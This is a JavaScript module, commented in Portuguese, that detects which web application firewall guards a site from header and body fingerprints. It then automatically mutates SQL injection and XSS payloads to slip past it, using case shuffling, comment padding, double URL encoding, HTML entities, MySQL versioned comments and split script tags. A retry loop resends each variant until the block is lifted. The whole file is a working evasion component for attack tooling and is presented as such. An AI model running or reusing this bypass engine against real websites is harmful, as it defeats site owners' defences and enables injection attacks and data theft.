/**
 * Payload mutator + WAF detection.
 *
 * Quando uma request recebe 403/406/429/blocked, executa cadeia de mutações
 * e reenvia. Detecção de WAF baseada em headers/body fingerprints conhecidos.
 */

const WAF_FINGERPRINTS = [
  { id: 'cloudflare', headers: [/cf-ray/i, /cf-cache-status/i, /server.*cloudflare/i], body: [/cloudflare/i, /attention required/i, /cf-error-details/i] },
  { id: 'akamai', headers: [/akamai/i, /^x-akamai/i], body: [/access denied.*akamai/i, /reference #18/i] },
  { id: 'aws-waf', headers: [/x-amzn-waf/i, /^x-amz-cf/i], body: [/aws.+waf/i] },
  { id: 'imperva', headers: [/x-iinfo/i, /x-cdn.*incapsula/i], body: [/incapsula/i, /imperva/i] },
  { id: 'sucuri', headers: [/x-sucuri/i, /server.*sucuri/i], body: [/sucuri/i, /access denied.*sucuri/i] },
  { id: 'f5', headers: [/x-wa-info/i, /^bigipserver/i], body: [/the requested url was rejected/i] },
  { id: 'fortinet', headers: [/fortiweb/i], body: [/fortinet/i, /attack id:/i] },
  { id: 'modsec', headers: [/mod_security/i], body: [/mod_security/i, /not acceptable/i] },
  { id: 'azure-waf', headers: [/x-azure-ref/i], body: [/microsoft-azure-application-gateway/i] },
];

export function detectWaf(response) {
  if (!response) return null;
  const headers = response.headers || {};
  const body = response.body || '';
  const status = response.status || response.statusCode;
  const flatHeaders = Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\n');
  const matches = [];
  for (const wf of WAF_FINGERPRINTS) {
    let hit = false;
    if (wf.headers.some((re) => re.test(flatHeaders))) hit = true;
    if (!hit && wf.body.some((re) => re.test(String(body).slice(0, 4096)))) hit = true;
    if (hit) matches.push(wf.id);
  }
  const blocked = [403, 406, 429, 451, 503].includes(status) || /blocked|denied|forbidden|attack/i.test(String(body).slice(0, 1024));
  return { vendor: matches[0] || null, all: matches, blocked, status };
}

/**
 * Mutações canônicas para bypass de WAF — independent de payload original.
 * Devolve array de payloads transformados em ordem de "delicadeza" crescente.
 */
export function mutatePayload(payload, { context = 'generic' } = {}) {
  const out = new Set([payload]);
  // Caso XSS / generic strings
  if (typeof payload === 'string') {
    out.add(payload.toUpperCase());
    out.add(payload.toLowerCase());
    out.add(caseShuffle(payload));
    out.add(payload.split('').join('/**/').slice(0, 8000));
    out.add(payload.replace(/ /g, '/**/'));
    out.add(payload.replace(/['"]/g, (m) => (m === '"' ? '&quot;' : '&#x27;')));
    out.add(urlEncodeAll(payload));
    out.add(urlEncodeAll(urlEncodeAll(payload)));
    out.add(htmlEntityEncode(payload));
    if (/select|union|where|from/i.test(payload)) {
      out.add(sqliMutations(payload));
    }
    if (/<script|onerror|onload|alert\(/i.test(payload)) {
      out.add(payload.replace(/script/gi, 'sCrIpT').replace(/alert/gi, 'AlErT'));
      out.add(payload.replace(/</g, '%3C').replace(/>/g, '%3E'));
      out.add(payload.replace(/script/gi, 'scr<x>ipt'));
    }
  }
  return [...out].filter(Boolean);
}

function caseShuffle(s) {
  let flag = false;
  return [...s].map((c) => { flag = !flag; return flag ? c.toUpperCase() : c.toLowerCase(); }).join('');
}

function urlEncodeAll(s) {
  return [...s].map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()}`).join('');
}

function htmlEntityEncode(s) {
  return [...s].map((c) => `&#${c.charCodeAt(0)};`).join('');
}

function sqliMutations(s) {
  return s
    .replace(/\bselect\b/gi, '/*!50000SELECT*/')
    .replace(/\bunion\b/gi, '/*!50000UNION*/')
    .replace(/\bfrom\b/gi, '/*!50000FROM*/')
    .replace(/ /g, '/**/');
}

/**
 * Pipeline: dado payload + executor + detector de bloqueio, tenta cada
 * mutação até passar (não-block) ou esgotar.
 *
 * executor(payload) → Promise<response>
 */
export async function tryWithMutations(payload, executor, { maxAttempts = 12, context = 'generic', stopOn = (r) => false } = {}) {
  const variants = mutatePayload(payload, { context }).slice(0, maxAttempts);
  const trail = [];
  for (const v of variants) {
    const resp = await executor(v).catch((e) => ({ error: e?.message || String(e) }));
    const waf = resp && !resp.error ? detectWaf(resp) : null;
    trail.push({ variant: v, status: resp?.status, blocked: waf?.blocked || false, vendor: waf?.vendor });
    if (resp && !resp.error && !waf?.blocked) {
      return { ok: true, variant: v, response: resp, trail };
    }
    if (resp && stopOn(resp)) {
      return { ok: false, stopped: true, variant: v, response: resp, trail };
    }
  }
  return { ok: false, exhausted: true, trail };
}
